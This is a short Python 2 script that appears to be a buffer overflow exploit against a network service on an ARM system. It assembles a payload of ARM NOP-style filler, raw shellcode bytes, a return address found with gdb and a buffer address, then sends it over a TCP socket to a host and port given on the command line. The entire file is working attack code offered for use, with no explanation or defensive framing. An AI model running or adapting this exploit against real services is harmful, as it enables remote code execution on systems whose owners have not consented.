#!/usr/bin/python

import sys, socket


# NoP + shellcode + "AAAA" + return address in main function (address after the calling function)
# + NoP + "AAAA" + buffer address  

shellcode = ("\x01\x10\xa0\xe1"*10
+ "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x0d\x48\x0e\x49\x40\x1a\x41\xf2\x68\x01\x07\x22\x7d\x27\x01\xdf\x07\x33\x18\x47\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x08\x48\x4f\xf0\x80\x71\x40\x1a\x07\x49\x01\x60\x07\x33\x18\x47\x1c\xb0\x8d\xe2\x14\x10\x9f\xe5\x01\xf4\x41\xe2\x02\x21\x11\x01\x02\x01\x10\x01\x7c\x2e\x01\x01\x01\x10\xa0\xe1"
+ "AAAA" + "\x70\x2e\x01\x01"        # return address using gdb (added by 0x01000000)
+ "\x01\x10\xa0\xe1"*43
+ "AAAA"+"\x64\xf0\xff\x7e")         # buffer address




if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "./injecting_code.py  192.168.1.27  5555"
    else:
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
        sock.connect(( sys.argv[1], int(sys.argv[2]) ))
        sock.send(shellcode)
        sock.close()

        print "InjectingCode: Shellcode Length: %d" %len(shellcode)
